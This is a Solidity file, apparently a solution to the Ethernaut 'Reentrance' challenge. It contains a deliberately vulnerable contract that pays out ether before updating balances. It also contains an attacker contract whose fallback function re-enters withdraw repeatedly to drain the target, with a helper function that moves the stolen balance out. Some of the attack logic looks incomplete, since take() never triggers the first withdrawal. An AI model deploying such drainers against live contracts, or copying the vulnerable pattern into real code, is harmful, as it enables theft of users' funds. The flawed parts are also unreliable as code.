// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract reenter { 
    Reentrance addr;
   uint256 public amnt=1 ether;
   using SafeMath for uint256;
    
    constructor(address payable _addr) public payable
    {
        addr=Reentrance(_addr);
        
        }
        fallback()  external payable{
          
            if(address(addr).balance>0){
              if(address(addr).balance.sub(amnt)>0){
            addr.withdraw(address(addr).balance.sub(amnt));
            }
             else{ addr.withdraw(amnt);}
             }

        }

        function take() public {
             addr.donate{value:amnt}(address(this));
             
        }
        //To take your test ether back in your account
        function w(address payable _w) public {
          _w.transfer(address(this).balance);
        }
       
}